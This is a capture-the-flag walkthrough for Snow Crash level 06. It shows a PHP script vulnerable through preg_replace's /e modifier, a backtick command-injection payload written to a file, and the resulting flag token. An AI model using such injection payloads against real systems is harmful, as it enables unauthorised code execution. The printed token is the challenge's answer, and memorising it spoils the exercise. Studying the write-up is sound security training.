# Snow Crash - Level 06

## Discovering the Vulnerability

Listing the directory contents with `ls`, we find an executable `level06` and a PHP script. Inspecting the script reveals the following code:

```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

## Understanding the Exploit

The script processes input by searching for patterns like `[x ...]` and using `preg_replace('/e')`. The `/e` modifier evaluates the matched expression as PHP code, making it possible to execute arbitrary commands.

In PHP, `${}` allows executing expressions within a string when used inside `preg_replace('/e')`, leading to a command injection vulnerability.

## Exploiting the Injection

By crafting an input file containing a malicious `[x ...]` pattern, we can execute `getflag` and retrieve the flag.

### Steps:

1. Create a file containing the exploit:

   ```bash
   echo '[x ${`getflag`}]' > /tmp/getflag.txt
   ```

2. Execute the vulnerable script:

   ```bash
   ./level06 /tmp/getflag.txt
   ```

3. The output reveals the flag:

   ```
   PHP Notice:  Undefined variable: Check flag. Here is your token : wiok45aaoguiboiki2tuin6ub
   in /home/user/level06/level06.php(4) : regexp code on line 1
   ```

This successfully retrieves the flag by exploiting the PHP code injection vulnerability.
